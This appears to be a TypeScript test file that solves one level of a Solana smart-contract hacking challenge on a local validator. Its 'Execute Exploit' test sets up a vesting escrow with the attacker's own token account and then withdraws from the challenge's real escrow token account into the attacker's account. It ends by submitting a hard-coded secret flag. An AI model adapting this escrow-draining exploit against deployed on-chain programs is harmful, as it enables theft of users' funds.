import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import { Level4 } from "../target/types/level_4";
import * as path from "path";
import * as fs from "fs";
import * as token from "@solana/spl-token";

const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD");
const ESCROW = new web3.PublicKey(
  "Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP"
);
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey(
  "2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv"
);
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey(
  "RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa"
);
const SENDER = new web3.PublicKey(
  "J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5"
);
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey(
  "2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8"
);

// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v

const SECRET =
  "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd";

// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x

describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair("../accounts/hacker.json");
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;

  provider.connection.onLogs("all", (logs) => {
    console.log("Solana Program Logs:", logs);
  });


  let escrowPdaAuthority: any;
  let escrowAccount = web3.Keypair.generate();
  

  before("Setup", async () => {
    await airdrop(
      provider.connection,
      hacker.publicKey,
      10 * anchor.web3.LAMPORTS_PER_SOL
    );

    await airdrop(
      provider.connection,
      escrowAccount.publicKey,
      10 * anchor.web3.LAMPORTS_PER_SOL
    );

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync(
      [anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")],
      program.programId
    );
  });

  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v
  it("Execute Exploit", async () => {

   
    console.log("Creating hacker's token account...");
    const customEscrowTokenAccount = await createTokenAccount(
      provider.connection,
      hacker,
      USDC,
      hacker.publicKey
    );


    const NOW = Math.floor(Date.now() / 1000); 
    console.log("NOW: ", NOW);
    const startAt = new anchor.BN(0);
    const endAt = startAt.add(new anchor.BN(2));
    const interval = new anchor.BN(1);
    const amount = new anchor.BN(1_334_000);

    console.log("Check math ", checkMath(new anchor.BN(NOW), startAt, endAt, interval, amount).toString());
    try {
      console.log("Calling initVesting...");
      await program.methods
        .initVesting(
          hacker.publicKey,
          amount,
          startAt, 
          endAt, 
          interval
        )
        .accounts({
          sender: hacker.publicKey,
          senderTokenAccount: HACKER_TOKEN_ACCOUNT,
          escrow: escrowAccount.publicKey,
          escrowTokenAccount: customEscrowTokenAccount,
          mint: USDC,
          tokenProgram: token.TOKEN_2022_PROGRAM_ID,
          systemProgram: web3.SystemProgram.programId,
        })
        .signers([escrowAccount, hacker])
        .rpc();

      console.log("Initialized successfully");
    } catch (error) {
      console.log("Error: ", error);
    }


    try {
      console.log("Calling withdrawUnlocked...");
      await program.methods
        .withdrawUnlocked()
        .accounts({
          recipient: hacker.publicKey,
          recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
          escrow: escrowAccount.publicKey,
          escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
          escrowPdaAuthority: escrowPdaAuthority,
          mint: USDC,
          tokenProgram: token.TOKEN_2022_PROGRAM_ID,
          systemProgram: web3.SystemProgram.programId,
        })
        .signers([hacker])
        .rpc();
      console.log("Withdrawn successfully");
    } catch (error) {
      console.log("Windraw error: ", error);
    }


    await displayTokenAccountBalance(HACKER_TOKEN_ACCOUNT, "Hacker Token Account", provider.connection);
    await displayTokenAccountBalance(customEscrowTokenAccount, "customEscrowTokenAccount", provider.connection);
    let balance = (await token.getAccount(provider.connection, ESCROW_TOKEN_ACCOUNT, 'confirmed', token.TOKEN_2022_PROGRAM_ID)).amount;
    console.log("Escrow balance: ", balance.toString());
    // await displayTokenAccountBalance(ESCROW_TOKEN_ACCOUNT, "Escrow Account", provider.connection);
    await displayTokenAccountBalance(SENDER_TOKEN_ACCOUNT, "Sender Token acc", provider.connection);
    

    try {
      await program.methods
        .revealSecret(SECRET)
        .accounts({
          hacker: hacker.publicKey,
          hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
          mint: USDC,
        })
        .signers([hacker])
        .rpc( 
        );
      } catch (error) {
        console.log("Error revealSecret:", error);
      }
  });

});

async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    "confirmed"
  );
}

function load_keypair(name: string): anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData));
}

async function createTokenAccount(
  connection: web3.Connection,
  payer: web3.Keypair,
  mint: web3.PublicKey,
  owner: web3.PublicKey
) {
  const tokenAccount = new web3.Keypair();

  const lamports = await token.getMinimumBalanceForRentExemptAccount(
    connection
  );

  console.log("Creating transaction...");

  const transaction = new web3.Transaction().add(
    web3.SystemProgram.createAccount({
      fromPubkey: payer.publicKey,
      newAccountPubkey: tokenAccount.publicKey,
      space: token.ACCOUNT_SIZE,
      lamports,
      programId: token.TOKEN_2022_PROGRAM_ID,
    }),
    token.createInitializeAccountInstruction(
      tokenAccount.publicKey,
      mint,
      owner,
      token.TOKEN_2022_PROGRAM_ID
    )
  );
  await web3.sendAndConfirmTransaction(connection, transaction, [
    payer,
    tokenAccount,
  ]);
  console.log("Token account created");
  return tokenAccount.publicKey;
}

async function displayTokenAccountBalance(
  accountPubkey: web3.PublicKey,
  accountName: string,
  connection: web3.Connection
) {
  try {
    const tokenAccount = await token.getAccount(
      connection,
      accountPubkey,
      'confirmed',
      token.TOKEN_2022_PROGRAM_ID // or splToken.TOKEN_PROGRAM_ID
    );

    const amountRaw = BigInt(tokenAccount.amount.toString()); // Ensure it's BigInt

    // Fetch the mint to get the decimals
    const mintInfo = await token.getMint(
      connection,
      tokenAccount.mint,
      'confirmed',
      token.TOKEN_2022_PROGRAM_ID // or splToken.TOKEN_PROGRAM_ID
    );
    const decimals = mintInfo.decimals;

    // Convert raw amount to human-readable amount
    const divisor = new anchor.BN(10).pow(new anchor.BN(decimals));
    const amount = Number(amountRaw) / Number(divisor);

    console.log(
      `${accountName} holds ${amount} UDCS tokens `
    );
  } catch (error) {
    console.error(
      `Failed to fetch token account balance for ${accountName}:`,
      error
    );
  }
}
function checkMath(NOW: anchor.BN, startAt: anchor.BN, endAt: anchor.BN, interval: anchor.BN, amount: anchor.BN): any {
  let time;
  if (NOW < endAt) {
    time = NOW;
    console.log("time = NOW");
  } else {
    time = endAt;
    console.log("time = endAt");
  }
  const duration = endAt.sub(startAt);
  console.log("duration: ", duration.toString());
  const intervalAmount = amount.mul(interval).div(duration);
  console.log("intervalAmount: ", intervalAmount.toString());
  const nrIntervals = time.sub(startAt).div(interval).add(new anchor.BN(1));
  console.log("nrIntervals: ", nrIntervals.toString());
  const ans =  nrIntervals.mul(intervalAmount).sub(new anchor.BN(0));
  console.log("ans: ", ans.toString());
  return  ans;
}

